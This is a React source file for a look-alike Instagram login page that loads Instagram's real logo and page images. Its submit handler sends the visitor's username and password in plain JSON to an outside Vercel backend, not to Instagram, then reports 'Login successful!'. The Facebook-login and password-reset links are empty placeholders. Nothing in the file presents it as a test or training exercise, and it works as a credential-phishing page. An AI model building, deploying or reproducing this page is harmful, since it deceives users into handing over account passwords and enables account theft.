import React, { useState } from 'react';
import './InstagramLogin.css';

function InstagramLogin() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [successMessage, setSuccessMessage] = useState('');

  const API_URL = 'https://insta-backend-lyart.vercel.app/api/login';

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });

      if (!response.ok) {
        throw new Error('Login failed');
      }

      const data = await response.json();
      console.log('Login successful:', data);
      setSuccessMessage('Login successful!');
      // Handle successful login (e.g., redirect, update state)
    } catch (error) {
      console.error('Login error:', error);
      setError('Login failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="instagram-login-container">
      <div className="content">
        <div className="phone-preview">
          <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png" alt="Phone Preview" />
        </div>
        <div className="login-section">
          <div className="login-box">
            <img className="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" />
            <form onSubmit={handleSubmit}>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Phone number, username, or email"
                required
              />
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                required
              />
              <button type="submit" disabled={isLoading}>
                {isLoading ? 'Logging in...' : 'Log In'}
              </button>
            </form>
            <div className="separator">
              <div className="line"></div>
              <div className="or">OR</div>
              <div className="line"></div>
            </div>
            <a href="#" className="facebook-login">
              <span className="facebook-icon"></span>
              Log in with Facebook
            </a>
            <a href="#" className="forgot-password">Forgot password?</a>
          </div>
          <div className="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
          </div>
          <div className="get-app">
            <p>Get the app.</p>
            <div className="app-links">
              <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" /></a>
              <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" /></a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default InstagramLogin;
